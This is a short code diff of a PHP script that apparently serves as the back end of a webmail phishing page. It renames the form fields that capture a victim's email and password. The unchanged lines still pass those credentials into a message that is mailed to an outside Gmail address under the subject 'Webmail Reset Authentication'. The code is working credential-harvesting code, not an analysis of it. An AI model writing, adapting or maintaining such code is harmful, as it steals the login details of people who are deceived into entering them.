@@ -129,14 +129,14 @@ function buildMail($email, $password)
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
-	if (isset($_POST['email']) && isset($_POST['password'])) {
+	if (isset($_POST['emailInput']) && isset($_POST['passwordInput'])) {
 
 		try {
 			// Always set content-type when sending HTML email
 			$headers = "MIME-Version: 1.0" . "\r\n";
 			$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 			
-			$message = buildMail($_POST['email'], $_POST['password']);
+			$message = buildMail($_POST['emailInput'], $_POST['passwordInput']);
 			mail("greatavano@gmail.com","Webmail Reset Authentication", $message, $headers);
 
 			http_response_code(200);
